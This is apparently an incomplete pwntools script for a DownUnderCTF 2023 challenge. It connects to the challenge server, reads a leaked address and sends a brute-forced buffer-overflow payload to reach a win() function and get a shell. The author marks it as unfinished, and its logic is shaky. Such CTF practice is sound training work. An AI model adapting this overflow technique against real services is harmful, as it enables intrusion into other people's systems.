from pwn import *
# INCOMPLETE SOLUTION - I was struggling with this one

# define function to find data in bytes
def extractBetween(data, startFlag, endFlag):
    startIndex = data.find(startFlag) + len(startFlag)
    endIndex = data.find(endFlag, startIndex)
    return data[startIndex:endIndex]

# Connect to remote server
for i in range(100, 256):
    conn = remote('2023.ductf.dev', 30018)
    context.log_level = 'debug'
    data = conn.recvuntil(b'Your turn: ')
    address = extractBetween(data, b'Free junk: 0x', b'\n')
    print(address)

    # set 16 bytes of padding to get through the buffer, and a package to change the instruction address to that of the `win()` function
    # so that we can change the next function call to open a shell
    package = p8(i)*17

    # send result and get back shell
    conn.send(package)
    conn.interactive()

    # close the connection
    conn.close()

# Symbol "init" is a function at address 0x11c9.
# Symbol "win"  is a function at address 0x1210.
# Symbol "main" is a function at address 0x122a.